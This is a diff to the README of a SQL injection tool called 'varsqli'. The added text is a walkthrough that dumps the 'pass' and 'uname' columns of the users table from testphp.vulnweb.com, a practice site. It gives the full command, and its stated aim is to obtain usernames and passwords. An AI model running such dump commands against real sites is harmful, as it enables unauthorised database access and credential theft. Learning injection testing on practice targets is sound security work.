@@ -67,3 +67,10 @@ $ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tabl
 ```
 $ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --columns -D acuart
 ```
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-17-00-16-21.jpg">
+
+- after i see it says find the number of columns entries of the whole database , so tables Users have some columns like : `id` , `cart` , `pass` , `uname` , now I will dump it , to dump the database  , we use options `-D <database name> --dump-all -T <tables item name> -C <column item name>`, command:
+```
+python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all -T users -C pass,uname
+```
+- this command I will dump the `password` and `uname` to get the username and password
